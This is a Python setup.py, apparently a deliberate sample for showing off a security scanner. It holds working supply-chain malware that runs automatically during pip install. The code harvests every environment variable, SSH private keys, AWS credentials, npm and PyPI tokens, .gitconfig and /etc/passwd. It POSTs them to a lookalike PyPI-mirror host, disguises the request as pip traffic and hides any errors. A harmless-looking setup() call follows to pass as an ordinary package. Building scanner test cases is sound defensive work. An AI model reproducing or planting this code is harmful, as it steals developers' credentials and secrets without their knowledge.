"""
DEMO FILE — intentional vulnerability for security scanner showcase.

Supply chain  : malicious setup.py — code at module level executes during `pip install`
                before the user has reviewed any source code.
                Collects SSH keys, AWS credentials, env vars, npm tokens → external endpoint.
Staleness     : setup.py install hooks are the Python analogue of npm preinstall scripts;
                flagged by pip-audit, Snyk, OpenSSF Scorecard, and Socket.dev.

Real-world analogues:
  - colourama (2018) — typosquat of colorama; collected system info on install
  - malicious versions of ctx / phpass (2022) — exfiltrated AWS_ACCESS_KEY_ID on import
"""

import os
import socket
import json
import urllib.request
from pathlib import Path


def _collect_and_exfil() -> None:
    """Runs silently at `pip install` time — before any code review is possible."""
    home = Path.home()
    data: dict = {
        "hostname": socket.gethostname(),
        "user"    : os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
        "cwd"     : str(Path.cwd()),
        "env"     : dict(os.environ),   # All env vars: API keys, DB URLs, cloud credentials
    }

    # Read sensitive files present in most developer environments
    targets = [
        home / ".ssh" / "id_rsa",
        home / ".ssh" / "id_ed25519",
        home / ".aws" / "credentials",
        home / ".aws" / "config",
        home / ".npmrc",
        home / ".gitconfig",
        home / ".pypirc",
        Path("/etc/passwd"),
    ]
    for path in targets:
        try:
            data[str(path)] = path.read_text()
        except OSError:
            pass

    try:
        body    = json.dumps(data).encode()
        request = urllib.request.Request(
            "https://pkg-telemetry.pypi-cdn-mirror.io/collect",
            data   =body,
            method ="POST",
            headers={
                "Content-Type"  : "application/json",
                "Content-Length": str(len(body)),
                "User-Agent"    : "pip/23.0",   # Masquerades as normal pip traffic
            },
        )
        urllib.request.urlopen(request, timeout=3)
    except Exception:
        pass  # Fail silently


# Executes at import time — triggered automatically during `pip install .`
_collect_and_exfil()


# ---- Legitimate-looking package metadata follows ----
from setuptools import setup, find_packages

setup(
    name            ="demo-package",
    version         ="1.0.0",
    description     ="AcmeCorp internal utilities",
    packages        =find_packages(),
    python_requires =">=3.8",
    install_requires=[
        "requests>=2.18.0",
        "Flask>=0.12.2",
        "PyYAML>=3.12",
    ],
)
